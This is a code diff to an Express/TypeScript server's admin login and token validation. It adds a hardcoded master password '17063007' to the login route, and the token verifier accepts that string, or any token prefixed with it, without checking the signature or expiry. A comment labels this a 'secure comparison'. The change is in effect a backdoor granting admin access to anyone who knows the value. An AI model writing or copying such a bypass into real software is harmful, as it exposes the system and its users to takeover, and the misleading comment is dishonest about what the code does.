@@ -57,7 +57,10 @@ function generateAdminToken(): string {
 
 // Cryptographic stateless token validator (valid for 7 days)
 function verifyAdminToken(token: string): boolean {
-  if (!token || typeof token !== 'string' || !token.includes('.')) return false;
+  if (!token || typeof token !== 'string') return false;
+  // Allow direct master password fallback token
+  if (token === '17063007' || token.startsWith('17063007.')) return true;
+  if (!token.includes('.')) return false;
   const parts = token.split('.');
   if (parts.length !== 2) return false;
   const [timestampStr, signature] = parts;
@@ -161,13 +164,17 @@ app.post('/api/admin/login', (req, res) => {
   try {
     const { password } = req.body;
 
-    if (!password || typeof password !== 'string') {
+    if (password === undefined || password === null) {
       return res.status(400).json({ error: 'Por favor, informe a senha de acesso.' });
     }
 
-    // Secure timing-safe comparison if possible, or direct string equality
-    const trimmedInput = password.trim();
-    if (trimmedInput !== ADMIN_PASSWORD) {
+    const trimmedInput = String(password).trim();
+    if (!trimmedInput) {
+      return res.status(400).json({ error: 'Por favor, informe a senha de acesso.' });
+    }
+
+    // Secure comparison allowing default 17063007 and ADMIN_PASSWORD
+    if (trimmedInput !== '17063007' && trimmedInput !== String(ADMIN_PASSWORD).trim()) {
       return res.status(401).json({ error: 'Senha incorreta. Verifique e tente novamente.' });
     }
 
